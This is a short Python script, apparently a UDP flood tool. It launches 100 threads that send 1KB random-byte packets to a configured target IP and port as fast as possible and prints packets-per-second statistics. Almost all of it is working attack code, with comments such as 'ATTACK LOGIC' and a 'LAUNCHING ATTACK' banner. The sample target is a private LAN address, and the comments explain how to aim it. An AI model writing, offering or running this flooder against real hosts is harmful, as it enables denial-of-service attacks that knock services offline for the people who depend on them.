import socket
import threading
import time
import random

# --- CONFIGURATION ---
# 1. Open Command Prompt (cmd)
# 2. Type 'ipconfig' and look for "IPv4 Address"
# 3. Paste that IP here:
TARGET_IP = "192.168.2.153"  # <--- CHANGE THIS to your Windows IP
TARGET_PORT = 80            # The port we will flood
THREAD_COUNT = 100          # Higher number = More lag/CPU usage

# --- ATTACK LOGIC ---
packet_count = 0
is_attacking = True

def attack():
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024) # 1KB packet
    
    while is_attacking:
        try:
            sock.sendto(bytes_data, (TARGET_IP, TARGET_PORT))
            packet_count += 1
            # Remove sleep for maximum speed
            # time.sleep(0.001) 
        except:
            pass
    sock.close()

if __name__ == "__main__":
    print(f"🔥 LAUNCHING ATTACK ON {TARGET_IP}...")
    print("Press CTRL+C to stop.")
    
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        
    try:
        start_time = time.time()
        while True:
            time.sleep(1)
            elapsed = time.time() - start_time
            print(f"Stats: {packet_count} packets sent (Speed: {int(packet_count/elapsed)} pkts/sec)")
    except KeyboardInterrupt:
        is_attacking = False
        print("\n🛑 ATTACK STOPPED.")